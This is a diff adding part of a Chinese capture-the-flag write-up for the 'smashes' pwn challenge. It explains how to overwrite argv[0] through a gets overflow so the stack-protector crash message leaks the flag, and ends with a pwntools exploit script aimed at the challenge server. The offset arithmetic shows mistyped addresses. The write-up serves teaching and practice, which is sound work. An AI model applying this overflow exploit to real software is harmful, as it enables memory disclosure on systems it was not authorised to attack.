@@ -117,3 +117,43 @@ LABEL_8:
 
 ### GDB
 
+用GDB打开文件，在main函数处下断点，r运行，vmmap查看内存映射
+
+```shell
+0x400000           0x401000 r-xp     1000 0      /home/ubuntu/Desktop/smashes
+0x600000           0x601000 rw-p     1000 0      /home/ubuntu/Desktop/smashes
+```
+
+两次映射分别以0x00600000和0x400000作为起始地址，flag在0x00000d20，所以在内存中为0x00400d20和0x00600d20找到flag
+
+
+
+### argv[0]
+
+argv[0]指向程序名，可以直接在GDB中`p & __libc_argv[0]`得到地址
+
+
+
+### 寻找栈顶
+
+在IDA中查看gets函数调用的位置
+
+在汇编中看出在call gets之前，程序将参数放在了rdi中，由于mov rdi,rsp的存在，因此gets的参数一开始放在栈里，在gets处下断点，看到当前的栈中rdi寄存器为rsp寄存器的内容，因为64位中rdi放的是当前函数的第一参数，所以当前栈顶的位置到刚才的argv[0]的偏移就是我们的溢出长度，0x7ffffffffdf68-0x7fffffffd50=0x218，也就是输入0x218个内容后把flag地址（0x00400d20）写上就行了
+
+
+
+### EXP
+
+```python
+#coding=utf8
+from pwn import *
+context.log_level = 'debug'
+p = remote('pwn.jarvisoj.com',9877)
+#p=process('./smashes')
+
+payload=b'a'*0x218+p64(0x400d20)
+p.sendlineafter('name? ',payload)
+p.sendlineafter('flag: ','Cyberangel')#第二次的gets输入任意内容即可
+print(p.recv())
+```
+
